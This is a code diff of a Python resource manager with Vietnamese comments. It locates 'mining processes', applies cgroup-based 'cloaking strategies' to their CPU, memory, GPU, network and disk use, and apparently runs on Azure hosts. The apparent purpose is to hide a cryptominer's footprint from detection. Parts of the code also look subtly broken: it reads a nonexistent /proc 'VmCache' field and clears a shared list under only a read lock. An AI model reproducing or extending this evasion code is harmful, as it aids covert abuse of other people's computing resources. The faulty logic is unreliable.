@@ -68,6 +68,34 @@ class SharedResourceManager:
         """
         self.gpu_manager.shutdown_nvml()  # Sử dụng GPUManager để shutdown NVML
 
+    def get_process_cache_usage(self, pid: int) -> float:
+        """
+        Lấy usage cache của tiến trình từ /proc/[pid]/status.
+
+        Args:
+            pid (int): PID của tiến trình.
+
+        Returns:
+            float: Cache usage phần trăm.
+        """
+        try:
+            with open(f"/proc/{pid}/status", 'r') as f:
+                for line in f:
+                    if line.startswith("VmCache:"):
+                        cache_kb = int(line.split()[1])  # VmCache: 12345 kB
+                        total_mem_kb = psutil.virtual_memory().total / 1024  # Tổng bộ nhớ hệ thống tính bằng kB
+                        cache_percent = (cache_kb / total_mem_kb) * 100
+                        self.logger.debug(f"PID={pid} sử dụng cache: {cache_percent:.2f}%")
+                        return cache_percent
+            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
+            return 0.0
+        except FileNotFoundError:
+            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
+            return 0.0
+        except Exception as e:
+            self.logger.error(f"Lỗi get_process_cache_usage cho PID={pid}: {e}\n{traceback.format_exc()}")
+            return 0.0
+
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess, cgroups: Dict[str, str]):
         """
         Áp dụng một chiến lược cloaking cho tiến trình đã cho.
@@ -81,13 +109,20 @@ class SharedResourceManager:
             pid = process.pid
             name = process.name
 
+            # Kiểm tra sự tồn tại của các controller cần thiết
+            required_controllers = ['cpu', 'ram', 'gpu', 'ionice', 'network', 'cache', 'disk_io']
+            for controller in required_controllers:
+                if controller not in cgroups:
+                    self.logger.error(f"Controller '{controller}' không được định nghĩa trong cgroups cấu hình: {cgroups}")
+                    return
+
             # Lưu trữ giới hạn tài nguyên ban đầu nếu chưa được lưu
             if pid not in self.original_resource_limits:
                 self.original_resource_limits[pid] = {}
 
                 if strategy_name == 'cpu':
                     current_quota = self.cgroup_manager.get_cgroup_parameter(
-                        cgroups['cpu'], 'cpu.cfs_quota_us', 'cpu'
+                        cgroups['cpu'], 'cpu.cfs_quota_us', 'cpu,cpuacct'
                     )
                     current_threads = self.cgroup_manager.get_cgroup_parameter(
                         cgroups['cpu'], 'cpuset.cpus', 'cpuset'
@@ -206,7 +241,6 @@ class SharedResourceManager:
             )
             raise
 
-
 class ResourceManager(BaseManager):
     """
     Lớp quản lý tài nguyên hệ thống, chịu trách nhiệm giám sát và điều chỉnh tài nguyên cho các tiến trình khai thác.
@@ -279,7 +313,7 @@ class ResourceManager(BaseManager):
         self.stop_event.set()
         self.executor.shutdown(wait=True)
         self.shared_resource_manager.shutdown_nvml()
-        self.shutdown_power_management()  # Gọi hàm shutdown_power_management
+        shutdown_power_management()  # Gọi hàm shutdown_power_management trực tiếp
         self.cgroup_manager.delete_cgroup('priority_cpu', controllers='cpu')  # Xóa cgroup priority_cpu nếu tồn tại
         self.logger.info("ResourceManager đã dừng.")
 
@@ -319,19 +353,19 @@ class ResourceManager(BaseManager):
         except Exception as e:
             self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")
 
-    def acquire_write_lock(self, lock: rwlock.RWLockFairWriteLock, timeout: Optional[float] = None) -> bool:
+    def acquire_write_lock(self, write_lock, timeout: Optional[float] = None) -> bool:
         """
         Tiện ích để chiếm write lock với timeout.
 
         Args:
-            lock (rwlock.RWLockFairWriteLock): Write lock cần chiếm.
+            write_lock: Đối tượng write lock từ RWLockFair.write_lock().
             timeout (Optional[float], optional): Thời gian chờ (giây). Defaults to None.
 
         Returns:
             bool: True nếu chiếm thành công, False nếu timeout.
         """
         try:
-            acquired = lock.acquire(timeout=timeout)
+            acquired = write_lock.acquire(timeout=timeout)
             if acquired:
                 self.logger.debug("Acquired write lock successfully.")
             else:
@@ -341,19 +375,19 @@ class ResourceManager(BaseManager):
             self.logger.error(f"Lỗi khi acquire_write_lock: {e}\n{traceback.format_exc()}")
             return False
 
-    def acquire_read_lock(self, lock: rwlock.RWLockFairReadLock, timeout: Optional[float] = None) -> bool:
+    def acquire_read_lock(self, read_lock, timeout: Optional[float] = None) -> bool:
         """
         Tiện ích để chiếm read lock với timeout.
 
         Args:
-            lock (rwlock.RWLockFairReadLock): Read lock cần chiếm.
+            read_lock: Đối tượng read lock từ RWLockFair.read_lock().
             timeout (Optional[float], optional): Thời gian chờ (giây). Defaults to None.
 
         Returns:
             bool: True nếu chiếm thành công, False nếu timeout.
         """
         try:
-            acquired = lock.acquire(timeout=timeout)
+            acquired = read_lock.acquire(timeout=timeout)
             if acquired:
                 self.logger.debug("Acquired read lock successfully.")
             else:
@@ -371,13 +405,12 @@ class ResourceManager(BaseManager):
             cpu_name = self.config['processes'].get('CPU', '').lower()
             gpu_name = self.config['processes'].get('GPU', '').lower()
 
-            write_lock = self.mining_processes_lock.gen_wlock()
-            acquired = write_lock.acquire(timeout=5)
-            if not acquired:
-                self.logger.error("Timeout khi acquire mining_processes_lock trong discover_mining_processes.")
-                return
+            # Sử dụng context managers để quản lý locks
+            with self.mining_processes_lock.read_lock(timeout=5) as read_lock:
+                if not read_lock:
+                    self.logger.error("Failed to acquire mining_processes_lock trong discover_mining_processes.")
+                    return
 
-            try:
                 self.mining_processes.clear()
                 for proc in psutil.process_iter(['pid', 'name']):
                     pname = proc.info['name'].lower()
@@ -391,8 +424,6 @@ class ResourceManager(BaseManager):
                 self.logger.info(
                     f"Khám phá {len(self.mining_processes)} tiến trình khai thác."
                 )
-            finally:
-                write_lock.release()
         except Exception as e:
             self.logger.error(f"Lỗi discover_mining_processes: {e}\n{traceback.format_exc()}")
 
@@ -558,16 +589,16 @@ class ResourceManager(BaseManager):
         """
         try:
             # Acquire write lock với timeout
-            write_lock = self.resource_lock.gen_wlock()
-            acquired = write_lock.acquire(timeout=5)
+            write_lock = self.resource_lock.write_lock()
+            acquired = self.acquire_write_lock(write_lock, timeout=5)
             if not acquired:
                 self.logger.error("Timeout khi acquire resource_lock trong allocate_resources_with_priority.")
                 return
 
             try:
                 # Acquire read lock với timeout
-                read_lock = self.mining_processes_lock.gen_rlock()
-                acquired_read = read_lock.acquire(timeout=5)
+                read_lock = self.mining_processes_lock.read_lock()
+                acquired_read = self.acquire_read_lock(read_lock, timeout=5)
                 if not acquired_read:
                     self.logger.error("Timeout khi acquire mining_processes_lock trong allocate_resources_with_priority.")
                     return
@@ -597,11 +628,28 @@ class ResourceManager(BaseManager):
 
                         # Sử dụng CgroupManager để tạo và thiết lập cgroup CPU
                         cpu_cgroup = f"cpu_cloak_{proc.pid}"
-                        self.cgroup_manager.create_cgroup(cpu_cgroup, controllers='cpu')
-                        self.cgroup_manager.set_cgroup_parameter(
-                            cpu_cgroup, 'cpu.cfs_quota_us', str(quota), controllers='cpu'
-                        )
-                        self.cgroup_manager.assign_process_to_cgroup(proc.pid, cpu_cgroup, controllers='cpu')
+                        try:
+                            created = self.cgroup_manager.create_cgroup(cpu_cgroup, controllers='cpu,cpuacct')
+                            if not created:
+                                self.logger.error(f"Không thể tạo cgroup '{cpu_cgroup}'. Bỏ qua tiến trình PID={proc.pid}.")
+                                continue
+                        except Exception as e:
+                            self.logger.error(f"Không thể tạo cgroup '{cpu_cgroup}': {e}")
+                            continue
+
+                        try:
+                            self.cgroup_manager.set_cgroup_parameter(
+                                cpu_cgroup, 'cpu.cfs_quota_us', str(quota), controllers='cpu,cpuacct'
+                            )
+                        except Exception as e:
+                            self.logger.error(f"Lỗi khi đặt tham số 'cpu.cfs_quota_us' cho cgroup '{cpu_cgroup}': {e}")
+                            continue
+
+                        try:
+                            self.cgroup_manager.assign_process_to_cgroup(proc.pid, cpu_cgroup, controllers='cpu,cpuacct')
+                        except Exception as e:
+                            self.logger.error(f"Lỗi khi gán PID={proc.pid} vào cgroup '{cpu_cgroup}': {e}")
+                            continue
                         
                         # Enqueue cloaking strategy
                         task = {
@@ -714,8 +762,8 @@ class ResourceManager(BaseManager):
                                     .get('bandwidth_limit_mbps', 100.0))  # Đảm bảo là float
             
             # Lấy metrics cache thông qua SharedResourceManager
-            cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid) if hasattr(self.shared_resource_manager, 'get_process_cache_usage') else 0.0
-
+            cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid) 
+            
             metrics = {
                 'cpu_usage_percent': float(cpu_pct),
                 'memory_usage_mb': float(mem_mb),
@@ -751,13 +799,11 @@ class ResourceManager(BaseManager):
         """
         metrics_data = {}
         try:
-            read_lock = self.mining_processes_lock.gen_rlock()
-            acquired_read = read_lock.acquire(timeout=5)
-            if not acquired_read:
-                self.logger.error("Timeout khi acquire mining_processes_lock trong collect_all_metrics.")
-                return metrics_data
+            with self.mining_processes_lock.read_lock(timeout=5) as read_lock:
+                if not read_lock:
+                    self.logger.error("Timeout khi acquire mining_processes_lock trong collect_all_metrics.")
+                    return metrics_data
 
-            try:
                 for proc in self.mining_processes:
                     metrics = self.collect_metrics(proc)
                     if not isinstance(metrics, dict):
@@ -774,8 +820,6 @@ class ResourceManager(BaseManager):
                         continue  # Bỏ qua PID này
                     metrics_data[str(proc.pid)] = metrics
                 self.logger.debug(f"Collected metrics data: {metrics_data}")
-            finally:
-                read_lock.release()
         except Exception as e:
             self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
         return metrics_data
@@ -788,7 +832,7 @@ class ResourceManager(BaseManager):
         self.stop_event.set()
         self.executor.shutdown(wait=True)
         self.shared_resource_manager.shutdown_nvml()  # Sử dụng GPUManager để shutdown NVML
-        self.shutdown_power_management()  # Gọi hàm shutdown_power_management
+        shutdown_power_management()  # Gọi hàm shutdown_power_management trực tiếp
         # Xóa các cgroup đã tạo nếu cần
         self.cgroup_manager.delete_cgroup('priority_cpu', controllers='cpu')
         self.logger.info("ResourceManager đã dừng.")
